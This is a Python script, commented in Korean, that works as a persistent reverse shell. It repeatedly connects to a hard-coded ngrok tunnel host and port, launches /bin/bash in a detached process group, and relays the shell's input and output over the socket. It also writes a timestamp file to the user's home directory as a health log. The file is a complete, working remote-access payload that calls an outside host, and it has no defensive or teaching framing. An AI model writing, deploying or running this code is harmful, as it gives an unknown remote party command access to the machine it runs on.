import socket
import os
from os.path import join
import time
import subprocess
import signal
import threading
from datetime import datetime

CONNECTION_REFUSED_TIMEOUT = 5  # 연결 거부 시 재시도 간격(초)
CONNECTION_BUT_NOT_LISTENING_TIMEOUT = 5  # 연결은 되었지만 서버가 연결을 수락하지 않는 경우 재시도 간격(초)

HOME_DIR = os.path.expanduser("~")

class ConnectedButNotListeningError(Exception):
    pass


def forward_stream(input_stream, output_socket):
    """스트림 데이터를 소켓으로 전달"""
    try:
        while True:
            data = input_stream.read(1024)  # 스트림에서 데이터 읽기
            if not data:
                break
            output_socket.sendall(data)  # 소켓으로 데이터 전송
    except Exception as e:
        print(f"Stream forwarding error: {e}")


def monitor_connection(host, port, stop_event):
    """소켓 연결 관리 및 프로세스 연결"""
    shell_process = None
    while not stop_event.is_set():
        try:
            # 소켓 생성 및 연결
            print(f"Connecting to {host}:{port}...")

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            print(f"Connected to {host}:{port}")

            data = s.recv(1)  # 소켓에서 데이터 읽기
            if not data:
                raise ConnectedButNotListeningError("The server is not listening for connections.")
            
            # 백그라운드에서 셸 실행
            shell_process = subprocess.Popen(
                ["/bin/bash"],  # 실행할 셸
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid,  # 자식 프로세스를 별도의 프로세스 그룹으로 실행
                bufsize=0,  # 실시간 처리를 위해 버퍼 크기를 0으로 설정
            )
            print(f"Shell started with PID: {shell_process.pid}")

            # stdout과 stderr를 소켓으로 전달
            stdout_thread = threading.Thread(target=forward_stream, args=(shell_process.stdout, s))
            stderr_thread = threading.Thread(target=forward_stream, args=(shell_process.stderr, s))
            stdout_thread.start()
            stderr_thread.start()

            # 소켓 데이터를 stdin으로 전달
            while not stop_event.is_set():
                data = s.recv(1024)  # 소켓에서 데이터 읽기
                if not data:
                    print("Connection lost. Terminating shell process...")
                    break
                shell_process.stdin.write(data)
                shell_process.stdin.flush()


            print("The server has closed the shell process.")
            # 연결이 끊어지면 루프 종료

        except TimeoutError:
            print("Connection timed out, retrying in 5 seconds...")
            time.sleep(5)
        except ConnectionError as e:
            print(f"Connection error ({e}), retrying in {CONNECTION_REFUSED_TIMEOUT} seconds...")
            time.sleep(CONNECTION_REFUSED_TIMEOUT)
        except ConnectedButNotListeningError as e:
            print(f"Connected but not listening ({e}), retrying in {CONNECTION_BUT_NOT_LISTENING_TIMEOUT} seconds...")
            time.sleep(CONNECTION_BUT_NOT_LISTENING_TIMEOUT)
        except Exception as e:
            print(f"Error: {e}, retrying in 1 seconds...")
            time.sleep(1)

        finally:
            # 소켓 닫기
            try:
                s.close()
            except Exception:
                pass

            # 셸 프로세스 종료
            if shell_process and shell_process.poll() is None:  # 프로세스가 아직 실행 중인지 확인
                os.killpg(os.getpgid(shell_process.pid), signal.SIGTERM)  # 프로세스 그룹 종료
                print(f"Shell process with PID {shell_process.pid} terminated.")
                shell_process = None

def write_health_logs(stop_event):
    """헬스 로그를 시간당 작성"""
    while not stop_event.is_set():
        with open(join(HOME_DIR, "startup.log"), "w") as log_file:

            timestamp = int(time.time())
            log_file.write(f"{timestamp}")
            log_file.flush()
        time.sleep(10)

if __name__ == "__main__":
    host = "7.tcp.ngrok.io"  # ngrok 호스트 주소
    port = 21501             # ngrok 포트 번호

    stop_event = threading.Event()

    # 헬스 로그 쓰기 쓰레드 시작
    health_thread = threading.Thread(target=write_health_logs, args=(stop_event,))
    health_thread.start()

    try:
        monitor_connection(host, port, stop_event)
    except KeyboardInterrupt:
        print("Terminating program...")
        stop_event.set()
        health_thread.join()